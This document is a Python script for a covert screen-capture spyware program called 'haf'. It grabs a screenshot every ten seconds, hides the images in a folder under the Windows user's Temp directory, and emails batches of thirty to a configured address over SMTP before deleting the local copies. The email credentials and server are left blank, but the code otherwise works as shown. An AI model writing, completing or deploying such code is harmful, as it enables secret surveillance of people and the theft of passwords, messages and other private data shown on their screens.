from email.message import EmailMessage
import smtplib
import math
import threading
import imghdr
import shutil
import zipfile
import os
import pyscreenshot 
import time
import random
import json

global screen_path
global image_count
global dir_count
global copy_path
global haf_path
global user_login

image_count = 0
dir_count = 0
user_login = os.getlogin()

haf_path = f"C:/Users/{user_login}/AppData/Local/Temp/haf"
screen_path = f"C:/Users/{user_login}/AppData/Local/Temp/haf/screen"
copy_path = f"C:/Users/{user_login}/AppData/Local/Temp/haf/copy"

def screenshot():
    
    global dir_count
    global image_count
    global haf_path
    global screen_path

    while True:

        time.sleep(10)

        if not os.path.exists(haf_path):
            os.mkdir(haf_path)  

        if not os.path.exists(screen_path):
            os.mkdir(screen_path)    

        if not os.path.exists(copy_path):
            os.mkdir(copy_path)    

        image = pyscreenshot.grab()

        file_path = f"{screen_path}/screen_{str(image_count)}.png"
        
        image.save(file_path)

        image_count += 1

        if image_count >= 30:

            dir_count += 1 

            print(dir_count)

            shutil.copytree(f'{screen_path}', f'{copy_path}/{dir_count}')

            shutil.rmtree(f'{screen_path}')

            image_count = 0

def send_mail():
    
    global copy_path

    email_address = ''
    email_password = ''
    email_to = ''

    msg = EmailMessage()
    msg['Subject'] = 'haf'
    msg['From'] = email_address
    msg['To'] = email_to

    msg.set_content('this is haf program')

    while True:

        time.sleep(10)

        min_path = os.listdir(copy_path)

        if len(min_path) > 0:

            min_path = min(os.listdir(copy_path))

            if len(os.listdir(f'{copy_path}/{min_path}')) >= 30:

                #read via byte
                for images in os.listdir(f'{copy_path}/{min_path}'):

                    with open(f'{copy_path}/{min_path}/{images}','rb') as file:

                        file_data = file.read()

                        file_type = imghdr.what(file.name)

                        file_name = file.name

                    msg.add_attachment(file_data, maintype = 'image',subtype = file_type, filename = file_name)

                #send message
                with smtplib.SMTP_SSL('', 465) as smtp:
                    
                    smtp.login(email_address, email_password)
                    
                    smtp.send_message(msg)
                    
                    shutil.rmtree(f'{copy_path}/{min_path}')
                    
                    print('sent')

t1 = threading.Thread(target = screenshot)
t2 = threading.Thread(target = send_mail)

t1.start()
t2.start()
